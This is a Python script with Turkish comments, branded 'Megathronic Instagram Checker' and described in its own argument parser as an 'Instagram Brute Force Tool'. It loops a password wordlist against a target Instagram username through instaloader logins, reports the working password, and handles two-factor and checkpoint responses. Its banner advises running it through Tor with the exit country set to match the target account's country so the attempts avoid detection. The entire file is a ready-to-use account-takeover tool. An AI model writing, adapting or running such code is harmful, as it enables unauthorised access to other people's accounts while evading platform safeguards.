import instaloader
from instaloader.exceptions import BadCredentialsException, ConnectionException, TwoFactorAuthRequiredException
import argparse
import os
import sys

os.system('clear')

# Renk kodları
GREEN = '\033[92m'  # Doğru parola ile giriş yapıldığında yeşil renk
RED = '\033[91m'    # Hatalı parola veya hata mesajı için kırmızı renk
BLUE = '\033[94m'   # Mavi renk
LIGHT_CYAN = '\033[96m'  # Açık mavi renk
RESET = '\033[0m'   # Renk sıfırlama
LIGHT_AQUA = '\033[96m'  # Açık su yeşili renk
LIGHT_PURPLE = '\033[95m'  # Açık mor renk
VERY_LIGHT_BLUE = '\033[38;2;173;216;230m'  # Çok açık mavi renk

# Instagram hesap bilgilerini kontrol etme fonksiyonu
def check_credentials(username, password):
    L = instaloader.Instaloader()
    try:
        L.login(username, password)  # Kullanıcı adı ve şifreyle giriş yap
        L.save_session_to_file()  # Oturumu dosyaya kaydet (isteğe bağlı)
        return True, None  # Başarılı giriş
    except BadCredentialsException:
        return False, None  # Hatalı giriş
    except TwoFactorAuthRequiredException:
        return False, "two_factor_auth"  # İki faktörlü kimlik doğrulama gerekli
    except ConnectionException as e:
        if "Checkpoint required" in str(e):
            return None, "checkpoint"  # Hesap doğrulaması gerektiği durumu
        else:
            return False, str(e)  # Diğer bağlantı hataları

# Hata mesajlarını özelleştirme fonksiyonu
def custom_error_message(message):
    print(f"{RED}[Error]: {message}{RESET}")
    sys.exit(1)  # Programı sonlandır

# ASCII sanatı (görsel) yazdırma fonksiyonu
def print_ascii_art():
    # ASCII sanatının ve metnin birleşimi
    ascii_art = f"""
{RESET}                .         ..
              .O           N.
            . .N.           .N. .
          ... Z..           ..Z ...
          ....N               N...,
        .N. N.               .N .N.
        7D.~N... .. . . ......N~.+7     Megathronic Instagram
       .D8.,.  .,.$DDNDND.,. ..,.,N.       ••• Checker •••
        .NN~....ZDDDNNNNNNNDNZ....~DN.
           .DN,..DIONNNZID..,NN.         Usage: megathronic.py
       ..:N....ND..NNNNN..DN....D7..     • [-u] : username.
      NN..    ~N  .NNNNN.  N:    ..NN    • [-p] : password wordlıst.
      DN      IN   .NNN.  .NI      NN
      ,N      ~N.  ..N..  .N~      N~    It is not recommended to run
      .N      .N.         .N.      N.    software without using a Tor proxy. 
       D:.    .N.         .N.     :D     (Enter the country of the target
       .N.    .8.         .N.    .N.     account in the Torrc file.)
         8.    .D.       .D.    .:
         .     ..=       =..     .      • coder by archescyber ♥️
                 ..     ..
                        .{RED}
"""

    # ASCII sanatını olduğu gibi yazdır
    print(ascii_art)

# Ana fonksiyon (programın çalıştığı yer)
def main():
    print_ascii_art()  # ASCII sanatı yazdırılır

    # Argüman tanımları (komut satırı parametreleri)
    parser = argparse.ArgumentParser(description="Instagram Brute Force Tool", add_help=False, exit_on_error=False)
    parser.add_argument("-u", "--username", type=str, required=True, help="Target Instagram username.")  # Hedef kullanıcı adı
    parser.add_argument("-p", "--password-file", type=str, required=True, help="Path to the password list file.")  # Parola dosyası yolu

    try:
        args = parser.parse_args()  # Komut satırı argümanlarını al
    except argparse.ArgumentError:
        custom_error_message("Parameter error please type carefully.")

    # Kullanıcı adı ve parola dosyasını alma
    username = args.username
    password_file = args.password_file

    # Şifreleri dosyadan okuyup liste haline getir
    def read_passwords_from_file(filename):
        try:
            with open(filename, 'r') as file:
                passwords = file.readlines()  # Parolaları dosyadan oku
            passwords = [password.strip() for password in passwords]  # Parolalardaki boşlukları temizle
            return passwords
        except FileNotFoundError:
            custom_error_message(f"File not found: {filename}. Please provide the correct file path.")  # Dosya bulunamadığında hata mesajı

    passwords = read_passwords_from_file(password_file)  # Parolaları oku
    found_correct_password = False  # Doğru parola bulunup bulunmadığını kontrol et
    checkpoint_warning_given = False  # Checkpoint uyarısı verilip verilmediğini kontrol et

    # Parolalar üzerinde döngü başlat
    for password in passwords:
        result, error = check_credentials(username, password)  # Hesap bilgilerini kontrol et
        if result:
            print(f"{GREEN}• Status Code 200:{RESET} {password}\n")  # Doğru parola bulundu
            found_correct_password = True
            break
        elif error == "checkpoint" and not checkpoint_warning_given:
            print(f"{RED}Checkpoint required. Please verify your account on Instagram.{RESET}")  # Checkpoint uyarısı
            choice = input(f"{RED}Do you want to continue despite the checkpoint warning? (y/n): {RESET}")  # Kullanıcıya sor
            if choice.lower() == 'y':
                checkpoint_warning_given = True  # İlk uyarı verildi
                continue
            else:
                print(f"{VERY_LIGHT_BLUE}Information: Stopping program per user request.{RESET}")  # Kullanıcı durdurma isteği
                break
        elif error == "checkpoint" and checkpoint_warning_given:
            continue
        elif error == "two_factor_auth":
            print(f"{VERY_LIGHT_BLUE}Two-factor authentication is enabled: {password}{RESET}\n")  # İki faktörlü kimlik doğrulama
            break
        else:
            print(f"{RED}• Status Code 400:{RESET} '{password}'\n")  # Yanlış parola

    if not found_correct_password:
        print(f"{LIGHT_PURPLE}Total:{RESET} {LIGHT_AQUA}All passwords are wrong.{RESET}\n")  # Tüm parolalar yanlış

# Ana fonksiyonu çalıştır
if __name__ == "__main__":
    main()
